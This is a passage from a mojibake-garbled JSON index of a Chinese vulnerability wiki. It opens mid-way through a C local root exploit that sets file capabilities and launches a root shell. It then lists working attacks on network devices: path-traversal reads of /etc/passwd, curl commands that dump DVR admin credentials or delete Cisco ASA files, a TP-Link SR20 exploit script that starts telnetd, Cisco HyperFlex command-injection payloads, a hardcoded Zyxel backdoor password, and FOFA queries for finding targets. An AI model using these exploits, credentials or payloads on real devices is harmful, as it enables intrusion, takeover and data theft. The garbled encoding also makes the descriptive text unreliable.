\"security.capability\", cap, sizeof(cap) - 1, 0) == -1) err(1, \"setxattr %s\", BIN_MERGE); return 0; } int main(int argc, char *argv[]) { if (strstr(argv[0], \"magic\") || (argc > 1 && !strcmp(argv[1], \"shell\"))) { setuid(0); setgid(0); execl(\"/bin/bash\", \"/bin/bash\", \"--norc\", \"--noprofile\", \"-i\", NULL); err(1, \"execl /bin/bash\"); } pid_t child = fork(); if (child == -1) err(1, \"fork\"); if (child == 0) { _exit(exploit()); } else { waitpid(child, NULL, 0); } execl(BIN_UPPER, BIN_UPPER, \"shell\", NULL); err(1, \"execl %s\", BIN_UPPER); } PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/","title":"ç½‘ç»œè®¾å¤‡æ¼æ´","keywords":"","body":"ç½‘ç»œè®¾å¤‡æ¼æ´ğŸ¦Š PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 19:49:20 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ACTI/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ACTI/","title":"ACTI","keywords":"","body":"ACTI ACTI è§†é¢‘ç›‘æ§ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-16 11:31:18 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ACTI/ACTI è§†é¢‘ç›‘æ§ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ACTI/ACTI è§†é¢‘ç›‘æ§ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html","title":"ACTI è§†é¢‘ç›‘æ§ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","keywords":"","body":"ACTI è§†é¢‘ç›‘æ§ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° ACTI è§†é¢‘ç›‘æ§ å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´å½±å“ [!NOTE] ACTIæ‘„åƒå¤´ FOFA [!NOTE] app=\"ACTi-è§†é¢‘ç›‘æ§\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ ä½¿ç”¨BurpæŠ“åŒ… /images/../../../../../../../../etc/passwd Goby & POC PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/DVR/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/DVR/","title":"DVR","keywords":"","body":"DVR DVR ç™»å½•ç»•è¿‡æ¼æ´ CVE-2018-9995 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-16 15:41:42 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/DVR/DVR ç™»å½•ç»•è¿‡æ¼æ´ CVE-2018-9995.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/DVR/DVR ç™»å½•ç»•è¿‡æ¼æ´ CVE-2018-9995.html","title":"DVR ç™»å½•ç»•è¿‡æ¼æ´ CVE-2018-9995","keywords":"","body":"DVR ç™»å½•ç»•è¿‡æ¼æ´ CVE-2018-9995 æ¼æ´æè¿° DVRï¼Œå…¨ç§°ä¸ºDigital Video Recorder(ç¡¬ç›˜å½•åƒæœº)ï¼Œå³æ•°å­—è§†é¢‘å½•åƒæœºã€‚æœ€åˆç”±é˜¿æ ¹å»·ç ”ç©¶å‘˜å‘ç°ï¼Œé€šè¿‡ä½¿ç”¨â€œCookieï¼š uid = adminâ€çš„Cookieæ ‡å¤´æ¥è®¿é—®ç‰¹å®šDVRçš„æ§åˆ¶é¢æ¿ï¼ŒDVRå°†ä»¥æ˜æ–‡å½¢å¼å“åº”è®¾å¤‡çš„ç®¡ç†å‘˜å‡­è¯ã€‚ æ¼æ´å½±å“ [!NOTE] Novo CeNova QSee Pulnix XVR 5 in 1 (title: \"XVR Login\") Securus, - Security. Never Compromise !! - Night OWL DVR Login HVR Login MDVR Login æ¼æ´å¤ç° ä½¿ç”¨curlå‘½ä»¤è·å¾—è´¦å·å¯†ç  curl \"http://xxx.xxx.xxx.xxx/device.rsp?opt=user&cmd=list\" -H \"Cookie: uid=admin\" PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/TP-Link/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/TP-Link/","title":"TP-Link","keywords":"","body":"TP-Link TP-Link SR20 è¿œç¨‹å‘½ä»¤æ‰§è¡Œ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-13 21:14:47 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/TP-Link/TP-Link SR20 è¿œç¨‹å‘½ä»¤æ‰§è¡Œ.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/TP-Link/TP-Link SR20 è¿œç¨‹å‘½ä»¤æ‰§è¡Œ.html","title":"TP-Link SR20 è¿œç¨‹å‘½ä»¤æ‰§è¡Œ","keywords":"","body":"TP-Link SR20 è¿œç¨‹å‘½ä»¤æ‰§è¡Œ æ¼æ´æè¿° æ®å¤–åª’æŠ¥é“ï¼Œè‘—åå®‰å…¨ä¸“å®¶ã€Google å®‰å…¨å·¥ç¨‹å¸ˆMatthew Garrettå…¬å¼€äº†TP-LINK SR20æ™ºèƒ½å®¶å±…è·¯ç”±å™¨ä¸€ä¸ªâ€œå…è®¸æ¥è‡ªæœ¬åœ°ç½‘ç»œè¿æ¥çš„ä»»æ„å‘½ä»¤æ‰§è¡Œâ€çš„æ¼æ´ã€‚æ”»å‡»è€…å¯é€šè¿‡è¯¥æ¼æ´æ§åˆ¶ç”¨æˆ·è·¯ç”±å™¨ï¼Œå€Ÿæ­¤æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå±åŠç”¨æˆ·éšç§å®‰å…¨ã€‚ æ¼æ´å½±å“ [!NOTE] TP-Link SR20 æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 # Create /testfile in your tftp root directory with the followingcontents: #function config_test(config) # os.execute(\"telnetd -l/bin/login.sh\") #end # Replace 192.168.0.1 with the IP address of the vulnerable device importbinascii importsocket port_send = 1040 port_receive = 61000 tddp_ver = \"01\" tddp_command = \"31\" tddp_req = \"01\" tddp_reply = \"00\" tddp_padding = \"%0.16X\"% 00 tddp_packet = \"\".join([tddp_ver, tddp_command, tddp_req,tddp_reply, tddp_padding]) sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) sock_receive.bind(( '', port_receive)) # Send a request sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) packet = binascii.unhexlify(tddp_packet) packet = packet + b\"/testfile;arbitrary\" print(packet) sock_send.sendto(packet, ( \"192.168.0.1\", port_send)) sock_send.close() response, addr = sock_receive.recvfrom( 1024) r = response.encode( 'hex') print(r) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-13 21:28:18 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Kyan/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Kyan/","title":"Kyan","keywords":"","body":"Kyan Kyan ç½‘ç»œç›‘æ§è®¾å¤‡ è´¦å·å¯†ç æ³„éœ²æ¼æ´ Kyan ç½‘ç»œç›‘æ§è®¾å¤‡ run.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-17 22:48:29 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Kyan/Kyan ç½‘ç»œç›‘æ§è®¾å¤‡ è´¦å·å¯†ç æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Kyan/Kyan ç½‘ç»œç›‘æ§è®¾å¤‡ è´¦å·å¯†ç æ³„éœ²æ¼æ´.html","title":"Kyan ç½‘ç»œç›‘æ§è®¾å¤‡ è´¦å·å¯†ç æ³„éœ²æ¼æ´","keywords":"","body":"Kyan ç½‘ç»œç›‘æ§è®¾å¤‡ è´¦å·å¯†ç æ³„éœ²æ¼æ´ æ¼æ´æè¿° Kyan ç½‘ç»œç›‘æ§è®¾å¤‡ å­˜åœ¨è´¦å·å¯†ç æ³„éœ²æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è·å¾—è´¦å·å¯†ç å’Œåå°æƒé™ æ¼æ´å½±å“ [!NOTE] Kyan FOFA [!NOTE] title=\"platform - Login\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ POC http://xxx.xxx.xxx.xxx/hosts æˆåŠŸè·å¾—è´¦å·å¯†ç  Goby & POC [!NOTE] Kyan design account password disclosure å‚è€ƒæ–‡ç«  https://www.secquan.org/BugWarning/1071987 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-05 09:13:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Kyan/Kyan ç½‘ç»œç›‘æ§è®¾å¤‡ run.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Kyan/Kyan ç½‘ç»œç›‘æ§è®¾å¤‡ run.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"Kyan ç½‘ç»œç›‘æ§è®¾å¤‡ run.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"Kyan ç½‘ç»œç›‘æ§è®¾å¤‡ run.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° Kyan ç½‘ç»œç›‘æ§è®¾å¤‡ run.phpå¯åœ¨èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹æ‰§è¡Œä»»æ„å‘½ä»¤, é…åˆè´¦å·å¯†ç æ³„éœ²æ¼æ´ï¼Œå¯ä»¥è·å–æœåŠ¡å™¨æƒé™ï¼Œå­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´å½±å“ [!NOTE] Kyan FOFA [!NOTE] title=\"platform - Login\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ ä½¿ç”¨ Gobusteræ‰«ææ–‡ä»¶ å…¶ä¸­ run.php æ–‡ä»¶å†…å®¹ä¸º Shell Execute PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 20:47:20 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Cisco/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Cisco/","title":"Cisco","keywords":"","body":"Cisco CISCO ASAè®¾å¤‡ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2020-3452 Cisco ASAè®¾å¤‡ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ CVE-2020-3187 Cisco HyperFlex HX storfs-asup è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-1497 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-18 12:45:09 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Cisco/Cisco ASAè®¾å¤‡ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ CVE-2020-3187.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Cisco/Cisco ASAè®¾å¤‡ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ CVE-2020-3187.html","title":"Cisco ASAè®¾å¤‡ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ CVE-2020-3187","keywords":"","body":"CISCO ASAè®¾å¤‡ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ CVE-2020-3187 æ¼æ´æè¿° Cisco ASA Softwareå’ŒFTD Softwareä¸­çš„WebæœåŠ¡æ¥å£å­˜åœ¨è·¯å¾„éå†æ¼æ´ï¼Œè¯¥æ¼æ´æºäºç¨‹åºæ²¡æœ‰å¯¹HTTP URLè¿›è¡Œæ­£ç¡®çš„è¾“å…¥éªŒè¯ã€‚è¿œç¨‹æ”»å‡»è€…å¯é€šè¿‡å‘é€å¸¦æœ‰ç›®å½•éå†åºåˆ—çš„ç‰¹åˆ¶HTTPè¯·æ±‚åˆ©ç”¨è¯¥æ¼æ´è¯»å–å¹¶åˆ é™¤ç³»ç»Ÿä¸Šçš„æ•æ„Ÿä¿¡æ¯ã€‚ æ¼æ´å½±å“ Cisco ASAè®¾å¤‡ Cisco FTDè®¾å¤‡ FOFA [!NOTE] /+CSCOE+/ Cisco-ASA æ¼æ´å¤ç° è®¿é—® http://xxx.xxx.xxx.xxx/+CSCOE+/session_password.html å­˜åœ¨åˆ™å¯èƒ½å‡ºç°æ­¤æ¼æ´ ä¾‹å¦‚æˆ‘ä»¬åˆ é™¤ä¸€å¼ å›¾ç‰‡ http://xxx.xxx.xxx.xxx/+CSCOU+/csco_logo.gif ä½¿ç”¨ curl å‘é€è¯·æ±‚ curl -H \"Cookie: token=../+CSCOU+/csco_logo.gif\" https://xxx.xxx.xxx.xxx/+CSCOE+/session_password.html æˆåŠŸåˆ é™¤å›¾æ ‡ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Cisco/Cisco HyperFlex HX storfs-asup è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-1497.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Cisco/Cisco HyperFlex HX storfs-asup è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-1497.html","title":"Cisco HyperFlex HX storfs-asup è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-1497","keywords":"","body":"Cisco HyperFlex HX storfs-asup è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-1497 æ¼æ´æè¿° æ€ç§‘åœ¨ç ”ç©¶äººå‘˜Nikita Abramovå’ŒMikhail Klyuchnikovå‘ç°çš„HyperFlex HXæ•°æ®å¹³å°ä¸­ä¿®å¤äº†ä¸¤ä¸ªUnauth RCEå’Œä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸Šè½½ æ¼æ´å½±å“ [!NOTE] Cisco HyperFlex HX æ¼æ´å¤ç° å‡ºç°æ¼æ´çš„ä»£ç  protected void processRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String action = request.getParameter(\"action\"); if (action == null) { String msg = \"Action for the servlet need be specified.\"; writeErrorResponse(response, msg); return; } try { String token = request.getParameter(\"token\"); StringBuilder cmd = new StringBuilder(); cmd.append(\"exec /bin/storfs-asup \"); cmd.append(token); String mode = request.getParameter(\"mode\"); cmd.append(\" \"); cmd.append(mode); cmd.append(\" > /dev/null\"); logger.info(\"storfs-asup cmd to run : \" + cmd); ProcessBuilder pb = new ProcessBuilder(new String[] { \"/bin/bash\", \"-c\", cmd.toString() }); logger.info(\"Starting the storfs-asup now: \"); long startTime = System.currentTimeMillis(); Process p = pb.start(); InputStream errStream = p.getErrorStream(); String errMsg = FileUtils.readToString(errStream); int exitCode = p.waitFor(); long timeTaken = System.currentTimeMillis() - startTime; logger.info(\"storfs-asup command completed in (\" + timeTaken + \" ) milliseconds, with exit code (\" + exitCode + \") and error message: \" + errMsg); errStream.close(); OutputStream outStream = p.getOutputStream(); outStream.flush(); outStream.close(); if (exitCode != 0) throw new Exception(errMsg); } catch (IOException ex) { logger.error(\"Failed to generate asup: \" + ex); } catch (Exception ie) { logger.error(\"Failed to run the /bin/storfs-asup command.\"); } finally { logger.info(\"Done executing asup command. \"); } } POCä¸º curl -v http://xxx.xxx.xxx.xxx/storfs-asup -d 'action=&token=`id`&mode=`id`' PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Cisco/Cisco HyperFlex HX upload ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ CVE-2021-1499.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Cisco/Cisco HyperFlex HX upload ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ CVE-2021-1499.html","title":"Cisco HyperFlex HX upload ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ CVE-2021-1499","keywords":"","body":"Cisco HyperFlex HX upload ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ CVE-2021-1499 æ¼æ´æè¿° æ€ç§‘åœ¨ç ”ç©¶äººå‘˜Nikita Abramovå’ŒMikhail Klyuchnikovå‘ç°çš„HyperFlex HXæ•°æ®å¹³å°ä¸­ä¿®å¤äº†ä¸¤ä¸ªUnauth RCEå’Œä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸Šè½½ æ¼æ´å½±å“ [!NOTE] Cisco HyperFlex HX æ¼æ´å¤ç° å‡ºç°æ¼æ´çš„ä»£ç ä¸º public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { this.isMultipart = ServletFileUpload.isMultipartContent(request); response.setContentType(\"application/json\"); PrintWriter out = response.getWriter(); if (!this.isMultipart) { out.println(\"{\\\"result\\\": \\\"Invalid content-type.\\\"}\"); logger.error(\"{\\\"result\\\": \\\"Invalid content-type. Must be multi-part\\\"}\"); response.setStatus(400); return; } ServletFileUpload upload = new ServletFileUpload(); upload.setSizeMax(this.maxFileSize); FileOutputStream fout = null; InputStream stream = null; try { FileItemIterator iter = upload.getItemIterator(request); while (iter.hasNext()) { try { FileItemStream fi = iter.next(); stream = fi.openStream(); String uploadedFileName = this.dirPath + \"/\" + fi.getName(); File uploadedFile = new File(uploadedFileName); fout = new FileOutputStream(uploadedFile); byte[] buffer = new byte[1024]; int len; while ((len = stream.read(buffer, 0, buffer.length)) != -1) fout.write(buffer, 0, len); out.println(\"{\\\"result\\\": \\\"filename: \" + uploadedFileName + \"\\\"}\"); logger.debug(\"{\\\"result\\\": \\\"filename: \" + uploadedFileName + \"\\\"}\"); } catch (org.apache.commons.fileupload.MultipartStream.MalformedStreamException ex) { logger.info(\"MalformedStreamException during file upload servlet stream processing: \" + ex); } finally { if (fout != null) { logger.info(\"Closing fout\"); fout.close(); } if (stream != null) { logger.info(\"Closing stream\"); stream.close(); } } } } catch (Exception ex) { out.println(\"{\\\"result\\\": \\\"Upload failed: \" + ex.getMessage() + \"\\\"}\"); logger.error(\"{\\\"result\\\": \\\"Upload failed: \" + ex.getMessage() + \"\\\"}\"); logger.error(\"Exception during file upload servlet stream processing: \" + ex); response.setStatus(500); } POCä¸º curl -v http://xxx.xxx.xxx.xxx/upload -F x=@/dev/null PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-18 12:53:50 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Zyxel/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Zyxel/","title":"Zyxel","keywords":"","body":"Zyxel Zyxel ç¡¬ç¼–ç åé—¨è´¦æˆ·æ¼æ´ CVE-2020-29583 Zyxel NBG2105 èº«ä»½éªŒè¯ç»•è¿‡ CVE-2021-3297 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-05 22:57:28 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Zyxel/Zyxel ç¡¬ç¼–ç åé—¨è´¦æˆ·æ¼æ´ CVE-2020-29583.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Zyxel/Zyxel ç¡¬ç¼–ç åé—¨è´¦æˆ·æ¼æ´ CVE-2020-29583.html","title":"Zyxel ç¡¬ç¼–ç åé—¨è´¦æˆ·æ¼æ´ CVE-2020-29583","keywords":"","body":"Zyxel ç¡¬ç¼–ç åé—¨è´¦æˆ·æ¼æ´ CVE-2020-29583 æ¼æ´æè¿° Zyxelå›ºä»¶ä¸­å‘ç°çš„åé—¨è¢«ç§°ä¸ºå…³é”®å›ºä»¶æ¼æ´ï¼ŒCVEç¼–å·CVE-2020-29583ï¼Œå¾—åˆ†ä¸º7.8 CVSSã€‚è™½ç„¶CVSSè¯„åˆ†çœ‹ä¼¼ä¸æ˜¯å¾ˆé«˜ï¼Œä½†å´ä¸å¯å°è§‘ã€‚ç ”ç©¶äººå‘˜è¡¨ç¤ºï¼Œè¿™æ˜¯ä¸€ä¸ªæä¸ºä¸¥é‡çš„æ¼æ´ï¼Œæ‰€æœ‰è€…å¿…é¡»ç«‹å³æ›´æ–°å…¶ç³»ç»Ÿã€‚å› ä¸ºä»»ä½•äººéƒ½å¯ä»¥è½»æ¾åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œä»DDoSåƒµå°¸ç½‘ç»œè¿è¥å•†åˆ°å‹’ç´¢è½¯ä»¶å›¢ä½“å’Œæ”¿åºœèµ„åŠ©çš„é»‘å®¢ã€‚ é€šè¿‡æ»¥ç”¨åé—¨è´¦æˆ·ï¼Œç½‘ç»œç½ªçŠ¯å¯ä»¥è®¿é—®æ˜“å—æ”»å‡»çš„è®¾å¤‡å¹¶æ„ŸæŸ“å†…éƒ¨ç½‘ç»œä»¥å‘èµ·å…¶ä»–æ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ç®¡ç†ç‰¹æƒç™»å½•è®¾å¤‡ï¼Œå¹¶è½»æ˜“ç ´åç½‘ç»œè®¾å¤‡ã€‚ æ¼æ´å½±å“ [!NOTE] Zyxel USGç³»åˆ— Zyxel ATPç³»åˆ— Zyxel NCXç³»åˆ— Zyxel USG FIEXç³»åˆ— Zyxel VPNç³»åˆ— FOFA [!NOTE] title=\"USG40\" \"NXC2500\" ç­‰ æ¼æ´å¤ç° åˆ†æå›ºä»¶ä¸­æœ‰ FTP çš„åé—¨å¯†ç  ä½¿ç”¨æ¼æ´æ‰«æè„šæœ¬æ‰¾åˆ°æ˜“å—æ”»å‡»çš„ç‰ˆæœ¬ è¿›è¡Œæ”»å‡»ï¼Œç™»å½•ä¸ºåé—¨ç®¡ç†å‘˜è´¦æˆ· zyfwp:PrOw!aN_fXp è¿™é‡Œä½¿ç”¨Gobyè®¾ç½®å­—å…¸æ‰«æå³å¯ å‚è€ƒæ–‡ç«  scan_CVE-2020-29583 Zyxel USG Series è´¦æˆ·ç¡¬ç¼–ç æ¼æ´ï¼ˆCVE-2020-29583ï¼‰ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Zyxel/Zyxel NBG2105 èº«ä»½éªŒè¯ç»•è¿‡ CVE-2021-3297.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Zyxel/Zyxel NBG2105 èº«ä»½éªŒè¯ç»•è¿‡ CVE-2021-3297.html","title":"Zyxel NBG2105 èº«ä»½éªŒè¯ç»•è¿‡ CVE-2021-3297","keywords":"","body":"Zyxel NBG2105 èº«ä»½éªŒè¯ç»•è¿‡ CVE-2021-3297 æ¼æ´æè¿° Zyxel NBG2105 å­˜åœ¨èº«ä»½éªŒè¯ç»•è¿‡ï¼Œæ”»å‡»è€…é€šè¿‡æ›´æ”¹ loginå‚æ•°å¯ç”¨å®ç°åå°ç™»é™† æ¼æ´å½±å“ [!NOTE] Zyxel NBG2105 FOFA [!NOTE] app=\"ZyXEL-NBG2105\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å…¶ä¸­å‰ç«¯æ–‡ä»¶ /js/util_gw.js å­˜åœ¨å‰ç«¯å¯¹ Cookie loginå‚æ•°çš„æ ¡éªŒ å¯ä»¥çœ‹åˆ°æ£€æµ‹åˆ° Cookieä¸­çš„ login=1 åˆ™è·³è½¬ home.html function setCookie() //login_ok.htm use { document.cookie=\"login=1\"; MM_goToURL('parent', 'home.htm'); } è¯·æ±‚å¦‚ä¸‹åˆ™ä¼šä»¥ç®¡ç†å‘˜èº«ä»½è·³è½¬åˆ° home.htmé¡µé¢ http://xxx.xxx.xxx.xxx/login_ok.htm Cookie: login=1; å‚è€ƒæ–‡ç«  https://github.com/nieldk/vulnerabilities/blob/main/zyxel%20nbg2105/Admin%20bypass PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/SonicWall/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/SonicWall/","title":"SonicWall","keywords":"","body":"SonicWall SSL-VPN è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ SonicWall SSL-VPN è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-26 14:51:16 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/SonicWall/SonicWall SSL-VPN è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/SonicWall/SonicWall SSL-VPN è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"SonicWall SSL-VPN è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"SonicWall SSL-VPN è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° SonicWall SSL-VPN è¿œç¨‹å‘½ä»¤æ‰§è¡Œåœ¨1æœˆ24æ—¥è¢«å…¬å¼€ EXPï¼Œæ­¤è®¾å¤‡å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´å½±å“ [!NOTE] SonicWall SSL-VPN FOFA [!NOTE] app=\"SONICWALL-SSL-VPN\" æ¼æ´å¤ç° å‡ºç°æ¼æ´çš„æ–‡ä»¶ä¸º /cgi-bin/jarrewrite.sh #!/bin/bash # jarrewrite.sh: # Script takes a jar/class file and a working directory; modifies class files # within the jar and repackages them. USAGE_STR=\"Usage: $0 \" # Validate number of args if [ $# -ne 2 ]; then echo ${USAGE_STR}; exit -1; fi for param in $*; do if [ \"$param\" == \"-h\" ]; then echo ${USAGE_STR}; exit 1; fi done # constants BOUNDARY=\"-------------------------------------------------------------\" BASE_DIR=/tmp JAVA_SRC=$1 WDIR=$2 CWD=`pwd` FULL_JAVA_SRC_PATH=${BASE_DIR}/${WDIR}/${JAVA_SRC} CLASSES_DIR=classes META_INF_DIR=${BASE_DIR}/${WDIR}/${CLASSES_DIR}/META-INF MANIFEST=${META_INF_DIR}/MANIFEST.MF MANIFEST_DIGEST_FILE=${META_INF_DIR}/SWALL_SIGNATURE.SF SIGNATURE_FILE=${META_INF_DIR}/SWALL_SIGNATURE.DSA CODESIGNER_CRT=./../../var/cs_cert/httprpCodeSignerX509Crt.pem CODESIGNER_PVTKEY=./../../var/cs_cert/httprpCodeSignerPvtkey.pem DO_SIGN=0 if [ ! -f ${FULL_JAVA_SRC_PATH} ];then echo \"File not found: ${FULL_JAVA_SRC_PATH}\"; exit -2; fi if [ ${JAVA_SRC##*.} == \"jar\" ] # Using bracket in variable substitution. then # organize mkdir ${BASE_DIR}/$WDIR/$CLASSES_DIR # unzip jar unzip -d ${BASE_DIR}/${WDIR}/${CLASSES_DIR} ${FULL_JAVA_SRC_PATH}; 